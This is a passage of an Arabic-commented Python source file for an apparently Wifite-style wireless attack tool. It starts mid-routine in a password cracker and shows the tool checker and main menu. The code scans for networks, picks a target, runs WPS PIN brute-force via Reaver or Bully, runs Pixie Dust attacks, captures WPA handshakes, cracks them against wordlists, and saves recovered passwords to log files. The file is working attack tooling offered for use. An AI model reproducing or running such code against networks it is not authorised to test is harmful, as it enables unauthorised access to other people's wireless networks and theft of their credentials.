                    if process.poll() is not None:
                        break
                    time.sleep(0.1)
                    progress_count += 1
                    
                    # تحديث شريط التقدم
                    if progress_count % 20 == 0:
                        elapsed = time.time() - start_time
                        progress = min(50, int(elapsed / 5))  # 5 ثواني لكل خطوة
                        print(f"\r[", end="")
                        print("█" * progress + " " * (50 - progress) + "]", end="")
                        sys.stdout.flush()
                    
                    continue
                
                print(f"\r{line[:100]}", end="")
                
                match = password_pattern.search(line)
                if match:
                    password = match.group(1)
                    break
            
            print()  # سطر جديد
            process.terminate()
            
            if password:
                print_status(f"تم كسر كلمة السر: {password}")
                return password
            else:
                print_warning("فشل في كسر كلمة السر")
                return None
                
        except Exception as e:
            print_error(f"خطأ في كسر كلمة السر: {e}")
            return None

# ===========================================
# SYSTEM CHECKER
# ===========================================
class SystemChecker:
    """فحص النظام والأدوات"""
    
    def __init__(self):
        self.required_tools = {
            'essential': ['iw', 'ip', 'aircrack-ng', 'airodump-ng'],
            'wps': ['reaver', 'bully', 'wash'],
            'optional': ['pixiewps', 'hcxdumptool', 'hashcat']
        }
        
        self.missing_tools = {}
        self.platform_info = self.detect_platform()
    
    def detect_platform(self) -> Dict:
        """الكشف عن المنصة"""
        info = {
            'system': os.uname().sysname,
            'release': os.uname().release,
            'machine': os.uname().machine,
            'termux': False,
            'ish': False,
            'linux': True
        }
        
        # الكشف عن Termux
        if 'android' in info['release'].lower() or 'termux' in info['system'].lower():
            info['termux'] = True
            info['linux'] = False
        
        # الكشف عن iSH
        if 'ish' in info['release'].lower():
            info['ish'] = True
            info['linux'] = False
        
        return info
    
    def check_tools(self) -> bool:
        """فحص الأدوات المثبتة"""
        all_present = True
        
        for category, tools in self.required_tools.items():
            missing = []
            for tool in tools:
                if not self.is_tool_installed(tool):
                    missing.append(tool)
                    if category == 'essential':
                        all_present = False
            
            if missing:
                self.missing_tools[category] = missing
        
        return all_present
    
    def is_tool_installed(self, tool: str) -> bool:
        """فحص إذا كانت الأداة مثبتة"""
        try:
            result = subprocess.run(['which', tool], 
                                  capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False
    
    def display_status(self) -> None:
        """عرض حالة النظام"""
        printc("\n" + "═" * 80, "cyan")
        printc("فحص النظام والأدوات", "bold")
        printc("═" * 80, "cyan")
        
        print(f"النظام: {self.platform_info['system']}")
        print(f"الإصدار: {self.platform_info['release']}")
        print(f"المعالج: {self.platform_info['machine']}")
        
        if self.platform_info['termux']:
            printc("المنصة: Termux (Android)", "yellow")
        elif self.platform_info['ish']:
            printc("المنصة: iSH (iOS)", "yellow")
        else:
            printc("المنصة: Linux", "green")
        
        printc("\nالأدوات المثبتة:", "bold")
        
        for category, tools in self.required_tools.items():
            print(f"\n{category.upper()}:")
            for tool in tools:
                if self.is_tool_installed(tool):
                    printc(f"  ✓ {tool}", "green")
                else:
                    printc(f"  ✗ {tool}", "red")
        
        if self.missing_tools:
            printc("\nأدوات مفقودة:", "yellow", True)
            for category, tools in self.missing_tools.items():
                print(f"  {category}: {', '.join(tools)}")
        
        printc("═" * 80, "cyan")

# ===========================================
# MAIN APPLICATION
# ===========================================
class WifiteWPSApp:
    """التطبيق الرئيسي"""
    
    def __init__(self):
        self.wireless = WirelessInterface()
        self.scanner = None
        self.wps_attacker = None
        self.wpa_attacker = None
        self.current_target = None
        self.selected_interface = None
        
        # إعداد المجلدات
        setup_directories()
        
        # فحص النظام
        self.system_checker = SystemChecker()
        
    def main_menu(self) -> None:
        """القائمة الرئيسية"""
        while True:
            clear_screen()
            print_banner()
            
            printc("\nالقائمة الرئيسية", "bold")
            printc("═" * 50, "cyan")
            print("1. فحص النظام والأدوات")
            print("2. اختيار واجهة شبكة")
            print("3. تفعيل وضع المراقبة")
            print("4. مسح الشبكات")
            print("5. عرض الشبكات المكتشفة")
            print("6. هجوم WPS (Reaver/Bully)")
            print("7. هجوم WPA/WPA2")
            print("8. Pixie Dust Attack")
            print("9. فحص WPS Locked")
            print("10. إدارة الجلسات")
            print("11. إعدادات")
            print("0. الخروج")
            printc("═" * 50, "cyan")
            
            choice = input("\nاختر خيارًا: ").strip()
            
            if choice == '1':
                self.check_system()
            elif choice == '2':
                self.select_interface()
            elif choice == '3':
                self.enable_monitor()
            elif choice == '4':
                self.scan_networks()
            elif choice == '5':
                self.show_networks()
            elif choice == '6':
                self.wps_attack()
            elif choice == '7':
                self.wpa_attack()
            elif choice == '8':
                self.pixie_dust_attack()
            elif choice == '9':
                self.check_wps_locked()
            elif choice == '10':
                self.manage_sessions()
            elif choice == '11':
                self.settings()
            elif choice == '0':
                self.exit_program()
            else:
                print_error("خيار غير صالح")
                input("\nاضغط Enter للمتابعة...")
    
    def check_system(self) -> None:
        """فحص النظام"""
        clear_screen()
        print_banner()
        
        print_info("جاري فحص النظام...")
        
        Animator.loading_bar(8, "فحص صلاحيات الجذر والأدوات...")
        
        # فحص صلاحيات الجذر
        if not check_root():
            input("\nاضغط Enter للعودة...")
            return
        
        # فحص الأدوات
        self.system_checker.check_tools()
        self.system_checker.display_status()
        
        input("\nاضغط Enter للعودة...")
    
    def select_interface(self) -> None:
        """اختيار واجهة الشبكة"""
        clear_screen()
        print_banner()
        
        interfaces = self.wireless.get_available_interfaces()
        
        if not interfaces:
            print_error("لم يتم العثور على واجهات لاسلكية")
            input("\nاضغط Enter للعودة...")
            return
        
        printc("الواجهات المتاحة:", "bold")
        for i, iface in enumerate(interfaces, 1):
            support = "يدعم Monitor" if self.wireless.check_interface_support(iface) else "لا يدعم"
            print(f"{i}. {iface} - {support}")
        
        try:
            choice = int(input("\nاختر رقم الواجهة: ").strip())
            if 1 <= choice <= len(interfaces):
                self.selected_interface = interfaces[choice - 1]
                print_status(f"تم اختيار الواجهة: {self.selected_interface}")
            else:
                print_error("اختيار غير صالح")
        except ValueError:
            print_error("الرجاء إدخال رقم صحيح")
        
        input("\nاضغط Enter للعودة...")
    
    def enable_monitor(self) -> None:
        """تفعيل وضع المراقبة"""
        clear_screen()
        print_banner()
        
        if not self.selected_interface:
            print_error("الرجاء اختيار واجهة أولاً")
            input("\nاضغط Enter للعودة...")
            return
        
        print_info(f"تفعيل وضع المراقبة على {self.selected_interface}...")
        
        monitor_iface = self.wireless.enable_monitor_mode(self.selected_interface)
        
        if monitor_iface:
            self.selected_interface = monitor_iface
        
        input("\nاضغط Enter للعودة...")
    
    def scan_networks(self) -> None:
        """مسح الشبكات"""
        clear_screen()
        print_banner()
        
        if not self.selected_interface:
            print_error("الرجاء تفعيل وضع المراقبة أولاً")
            input("\nاضغط Enter للعودة...")
            return
        
        try:
            duration = input("مدة المسح (ثانية) [20]: ").strip()
            duration = int(duration) if duration.isdigit() else 20
            
            self.scanner = NetworkScanner(self.selected_interface)
            success = self.scanner.scan(duration)
            
            if success and self.scanner.networks:
                print_status(f"تم اكتشاف {len(self.scanner.networks)} شبكة")
            elif not success:
                print_error("فشل في المسح")
        
        except Exception as e:
            print_error(f"خطأ: {e}")
        
        input("\nاضغط Enter للعودة...")
    
    def show_networks(self) -> None:
        """عرض الشبكات"""
        clear_screen()
        print_banner()
        
        if not self.scanner or not self.scanner.networks:
            print_error("لم يتم مسح الشبكات بعد")
            input("\nاضغط Enter للعودة...")
            return
        
        self.scanner.display_networks()
        
        # اختيار شبكة
        try:
            choice = input("\nأدخل رقم الشبكة للاختيار (أو Enter للتخطي): ").strip()
            if choice and choice.isdigit():
                idx = int(choice)
                self.current_target = self.scanner.get_network_by_index(idx)
                if self.current_target:
                    print_status(f"تم اختيار: {self.current_target['essid']}")
        except:
            pass
        
        input("\nاضغط Enter للعودة...")
    
    def wps_attack(self) -> None:
        """هجوم WPS"""
        clear_screen()
        print_banner()
        
        if not self.current_target:
            print_error("الرجاء اختيار شبكة أولاً")
            input("\nاضغط Enter للعودة...")
            return
        
        if not self.current_target.get('wps', False):
            print_error("هذه الشبكة لا تدعم WPS")
            input("\nاضغط Enter للعودة...")
            return
        
        print_info(f"بدء هجوم WPS على {self.current_target['essid']}")
        print_info(f"BSSID: {self.current_target['bssid']}")
        print_info(f"القناة: {self.current_target['channel']}")
        
        # اختيار أداة الهجوم
        printc("\nاختر أداة الهجوم:", "bold")
        print("1. Reaver (موصى به)")
        print("2. Bully")
        print("3. المحاولة بكليهما")
        
        tool_choice = input("\nاختر الأداة [1]: ").strip() or "1"
        
        # تعيين القناة
        self.wireless.set_channel(self.selected_interface, 
                                 int(self.current_target['channel']))
        
        # إنشاء المهاجم
        self.wps_attacker = WPSAttacker(self.selected_interface, self.current_target)
        
        results = None
        
        try:
            if tool_choice == '1':
                results = self.wps_attacker.attack_with_reaver()
            elif tool_choice == '2':
                results = self.wps_attacker.attack_with_bully()
            elif tool_choice == '3':
                # محاولة Reaver أولاً
                print_info("محاولة Reaver أولاً...")
                results = self.wps_attacker.attack_with_reaver()
                
                if not results['success']:
                    print_info("محاولة Bully...")
                    self.wps_attacker.stop()
                    time.sleep(2)
                    results = self.wps_attacker.attack_with_bully()
            
            if results:
                self.display_attack_results(results)
                
        except KeyboardInterrupt:
            print_warning("تم إيقاف الهجوم")
        except Exception as e:
            print_error(f"خطأ في الهجوم: {e}")
        finally:
            if self.wps_attacker:
                self.wps_attacker.stop()
        
        input("\nاضغط Enter للعودة...")
    
    def wpa_attack(self) -> None:
        """هجوم WPA/WPA2"""
        clear_screen()
        print_banner()
        
        if not self.current_target:
            print_error("الرجاء اختيار شبكة أولاً")
            input("\nاضغط Enter للعودة...")
            return
        
        print_info(f"بدء هجوم WPA على {self.current_target['essid']}")
        
        # اختيار wordlist
        wordlists = list(Config.WORDLISTS_DIR.glob("*.txt"))
        
        if wordlists:
            printc("\nقوائم الكلمات المتاحة:", "bold")
            for i, wl in enumerate(wordlists, 1):
                print(f"{i}. {wl.name}")
            
            print(f"{len(wordlists) + 1}. إدخال مسار مخصص")
            
            try:
                choice = input("\nاختر قائمة الكلمات: ").strip()
                
                if choice.isdigit():
                    idx = int(choice)
                    if 1 <= idx <= len(wordlists):
                        wordlist_path = str(wordlists[idx - 1])
                    elif idx == len(wordlists) + 1:
                        wordlist_path = input("أدخل المسار الكامل: ").strip()
                    else:
                        print_error("اختيار غير صالح")
                        return
                else:
                    print_error("الرجاء إدخال رقم")
                    return
            except:
                print_error("خطأ في الاختيار")
                return
        else:
            wordlist_path = input("أدخل مسار قائمة الكلمات: ").strip()
        
        if not os.path.exists(wordlist_path):
            print_error(f"ملف قائمة الكلمات غير موجود: {wordlist_path}")
            input("\nاضغط Enter للعودة...")
            return
        
        # إنشاء المهاجم
        self.wpa_attacker = WPAAttacker(self.selected_interface)
        
        try:
            # التقاط الهاندشيك
            if self.wpa_attacker.capture_handshake(self.current_target):
                # كسر كلمة السر
                password = self.wpa_attacker.crack_password(wordlist_path)
                
                if password:
                    print_status(f"تم كسر الشبكة بنجاح!")
                    print_status(f"كلمة السر: {password}")
                    
                    # حفظ النتيجة
                    result_file = Config.LOGS_DIR / f"wpa_{self.current_target['essid']}_{int(time.time())}.txt"
                    with open(result_file, 'w') as f:
                        f.write(f"ESSID: {self.current_target['essid']}\n")
                        f.write(f"BSSID: {self.current_target['bssid']}\n")
                        f.write(f"Password: {password}\n")
                        f.write(f"Date: {datetime.now()}\n")
                    
                    print_status(f"تم حفظ النتيجة في: {result_file}")
                else:
                    print_warning("فشل في كسر كلمة السر")
            else:
                print_error("فشل في التقاط الهاندشيك")
                
        except KeyboardInterrupt:
            print_warning("تم إيقاف الهجوم")
        except Exception as e:
            print_error(f"خطأ في الهجوم: {e}")
        
        input("\nاضغط Enter للعودة...")
    
    def pixie_dust_attack(self) -> None:
        """هجوم Pixie Dust"""
        clear_screen()
        print_banner()
        
        if not self.current_target:
            print_error("الرجاء اختيار شبكة أولاً")
            input("\nاضغط Enter للعودة...")
            return
        
        print_info(f"بدء هجوم Pixie Dust على {self.current_target['essid']}")
        
        self.wps_attacker = WPSAttacker(self.selected_interface, self.current_target)
        
        try:
            results = self.wps_attacker.pixie_dust_attack()
            self.display_attack_results(results)
        except Exception as e:
            print_error(f"خطأ في هجوم Pixie Dust: {e}")
        finally:
            if self.wps_attacker:
                self.wps_attacker.stop()
        
        input("\nاضغط Enter للعودة...")
    
    def check_wps_locked(self) -> None:
        """فحص قفل WPS"""
        clear_screen()
        print_banner()
        
        if not self.current_target:
            print_error("الرجاء اختيار شبكة أولاً")
            input("\nاضغط Enter للعودة...")
            return
        
        self.wps_attacker = WPSAttacker(self.selected_interface, self.current_target)
        
        try:
            is_locked = self.wps_attacker.check_wps_locked()
            
            if is_locked:
                print_warning("WPS مقفل. الهجوم قد يفشل.")
            else:
                print_status("WPS غير مقفل. الهجوم ممكن.")
        
        except Exception as e:
            print_error(f"خطأ في فحص WPS: {e}")
        
        input("\nاضغط Enter للعودة...")
    
    def display_attack_results(self, results: Dict) -> None:
        """عرض نتائج الهجوم"""
        printc("\n" + "═" * 60, "cyan")
        printc("نتائج الهجوم", "bold")
        printc("═" * 60, "cyan")
        
        print(f"الحالة: {'نجاح' if results['success'] else 'فشل'}")
        print(f"الوقت المستغرق: {results['time_taken']:.1f} ثانية")
        
        if results.get('attempts'):
            print(f"عدد المحاولات: {results['attempts']}")
        
        if results.get('pin'):
            print(f"PIN: {results['pin']}")
        
        if results.get('password'):
            print(f"كلمة السر: {results['password']}")
            
            # حفظ النتيجة
            if self.current_target:
                result_file = Config.LOGS_DIR / f"wps_{self.current_target['essid']}_{int(time.time())}.txt"
                with open(result_file, 'w') as f:
                    f.write(f"ESSID: {self.current_target['essid']}\n")
                    f.write(f"BSSID: {self.current_target['bssid']}\n")
                    if results['pin']:
                        f.write(f"WPS PIN: {results['pin']}\n")
                    f.write(f"Password: {results['password']}\n")
                    f.write(f"Time: {results['time_taken']:.1f}s\n")
                    f.write(f"Date: {datetime.now()}\n")
                
                print_status(f"تم حفظ النتيجة في: {result_file}")
        
        printc("═" * 60, "cyan")
    
    def manage_sessions(self) -> None:
        """إدارة الجلسات"""
        clear_screen()
        print_banner()
        
        sessions = list(Config.SESSIONS_DIR.glob("*.session"))
        
        if not sessions:
            print_info("لا توجد جلسات محفوظة")
            input("\nاضغط Enter للعودة...")
            return
        
        printc("الجلسات المحفوظة:", "bold")
        for i, session in enumerate(sessions, 1):
            size = os.path.getsize(session) // 1024  # بالكيلوبايت
            mtime = datetime.fromtimestamp(os.path.getmtime(session))
            print(f"{i}. {session.stem} - {size}KB - {mtime}")
        
        try:
            choice = input("\nاختر رقم الجلسة للمزيد (أو Enter للتخطي): ").strip()
            if choice and choice.isdigit():
                idx = int(choice)
                if 1 <= idx <= len(sessions):
                    session_file = sessions[idx - 1]
                    
                    printc(f"\nمعلومات الجلسة: {session_file.name}", "bold")
                    
                    with open(session_file, 'r') as f:
                        content = f.read()
                    
                    if content:
                        print(content[:500] + "..." if len(content) > 500 else content)
                    else:
                        print("الجلسة فارغة")
                    
                    # خيارات الجلسة
                    printc("\nخيارات:", "bold")
                    print("1. حذف الجلسة")
                    print("2. استئناف الهجوم من الجلسة")
                    print("3. العودة")
                    
                    action = input("\nاختر إجراء: ").strip()
                    
                    if action == '1':
                        os.remove(session_file)
                        print_status("تم حذف الجلسة")
                    elif action == '2':
                        if self.current_target:
                            print_info("جاري استئناف الهجوم...")
                            # هنا يمكن إضافة منطق استئناف الهجوم
                        else:
                            print_error("الرجاء اختيار شبكة أولاً")
        
        except Exception as e:
            print_error(f"خطأ: {e}")
        
        input("\nاضغط Enter للعودة...")
    
    def settings(self) -> None:
        """الإعدادات"""
        clear_screen()
        print_banner()
        
        printc("الإعدادات", "bold")
        printc("═" * 50, "cyan")
        
        print(f"1. وقت المسح: {Config.SCAN_TIME} ثانية")
        print(f"2. مهلة WPS: {Config.WPS_TIMEOUT} ثانية")
        print(f"3. عدد محاولات WPS: {Config.WPS_RETRIES}")
        print("4. تغيير المسار الافتراضي")
        print("5. مسح جميع السجلات")
        print("6. العودة")
        
        try:
            choice = input("\nاختر خيارًا: ").strip()
            
            if choice == '1':
                new_time = input(f"وقت المسح الجديد [{Config.SCAN_TIME}]: ").strip()
                if new_time.isdigit():
                    Config.SCAN_TIME = int(new_time)
                    print_status("تم تحديث وقت المسح")
            
            elif choice == '2':
                new_timeout = input(f"مهلة WPS الجديدة [{Config.WPS_TIMEOUT}]: ").strip()
                if new_timeout.isdigit():
                    Config.WPS_TIMEOUT = int(new_timeout)
                    print_status("تم تحديث مهلة WPS")
            
            elif choice == '3':
                new_retries = input(f"عدد المحاولات الجديد [{Config.WPS_RETRIES}]: ").strip()
                if new_retries.isdigit():
                    Config.WPS_RETRIES = int(new_retries)
                    print_status("تم تحديث عدد المحاولات")
            
            elif choice == '4':
                new_path = input("المسار الجديد: ").strip()
                if os.path.isdir(new_path):
                    Config.BASE_DIR = Path(new_path)
                    setup_directories()
                    print_status("تم تغيير المسار")
                else:
                    print_error("مسار غير صالح")
            
            elif choice == '5':
                confirm = input("هل أنت متأكد من مسح جميع السجلات؟ (y/n): ").lower()
                if confirm == 'y':
                    for item in Config.CAPTURES_DIR.glob("*"):
                        if item.is_file():
                            item.unlink()
                    print_status("تم مسح السجلات")
            
            elif choice == '6':
                return
        
        except Exception as e:
            print_error(f"خطأ: {e}")
        
        input("\nاضغط Enter للعودة...")
    
    def exit_program(self) -> None:
        """خروج من البرنامج"""
        clear_screen()
        print_banner()
        
        print_info("جاري الخروج...")
        
        Animator.loading_bar(5, "جاري إنهاء العمليات...")
        
        # تعطيل وضع المراقبة
        if self.selected_interface:
            self.wireless.disable_monitor_mode()
        
        # إيقاف أي هجمات نشطة
        if self.wps_attacker:
            self.wps_attacker.stop()
        
        print_status("تم إنهاء جميع العمليات")
        print_info(f"شكراً لاستخدامك الأداة!")
        print_info(f"المطور: {Config.AUTHOR}")
        print_info(f"التواصل: {Config.CONTACT}")
        
        time.sleep(2)
        sys.exit(0)

# ===========================================
# MAIN EXECUTION
# ===========================================
def main():
    """الدالة الرئيسية"""
    try:
        # عرض البانر
        clear_screen()
        print_banner()
        
        # فحص صلاحيات الجذر
        if not check_root():
            sys.exit(1)
        
        # فحص النظام
        checker = SystemChecker()
        if not checker.check_tools():
            checker.display_status()
            
            print_warning("بعض الأدوات الأساسية مفقودة")
            choice = input("هل تريد المتابعة على أي حال؟ (y/n): ").lower()
            if choice != 'y':
                sys.exit(1)
        
        # تشغيل التطبيق
        app = WifiteWPSApp()
        app.main_menu()
        
    except KeyboardInterrupt:
        print_warning("\nتم إيقاف البرنامج بواسطة المستخدم")
        sys.exit(0)
    except Exception as e:
        print_error(f"خطأ غير متوقع: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()